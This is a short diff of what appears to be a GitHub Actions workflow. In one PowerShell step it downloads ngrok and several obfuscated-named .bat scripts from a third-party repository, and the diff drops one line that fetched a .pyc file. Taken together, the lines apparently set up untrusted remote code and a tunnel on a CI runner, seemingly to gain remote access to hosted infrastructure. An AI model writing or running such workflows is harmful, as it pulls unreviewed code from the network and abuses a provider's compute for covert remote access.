@@ -14,7 +14,6 @@ jobs:
         Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
         Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/z360FM0OMMpppzzFO.bat -OutFile z360FM0OMMpppzzFO.bat
         Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/5vG0S7L5GS65R6G56.bat -OutFile 5vG0S7L5GS65R6G56.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/kAgu3BovA4o1AdeUv.pyc -OutFile kAgu3BovA4o1AdeUv.pyc
 
     - name: Extracting Ngrok Files.
       run: Expand-Archive ngrok.zip
